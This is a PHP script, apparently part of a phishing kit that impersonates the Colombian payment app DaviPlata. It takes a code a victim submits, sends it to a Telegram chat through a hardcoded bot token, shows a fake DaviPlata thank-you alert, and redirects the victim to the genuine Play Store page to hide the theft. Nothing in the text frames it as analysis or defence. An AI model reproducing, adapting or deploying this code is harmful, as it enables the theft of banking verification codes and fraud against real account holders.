<?php
ini_set("display_errors", 0);

////////////////////
if ( isset ($_POST['codi'])  ){

$message = "Codigo2: ".$_POST['codi']."\r\n";

$apiToken = "5590338703:AAEeurTEIaJZFuwaCY3pGdUHPRzRQELX9fs";


$data = [
  'chat_id' => '-1001901333657',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


}else{ header ('location: index.php'); exit();
 }

?>


<script language="javascript">alert("GRACIAS POR SU TIEMPO!\r\nDAVIPLATA AGRADECE TU ATENCIÓN.\r\nACEPTE PARA FINALIZAR.");</script>';
<script type="text/javascript">window.location.href = "https://play.google.com/store/apps/details?id=com.davivienda.daviplataapp&hl=en_US&gl=US";</script>';
}
?>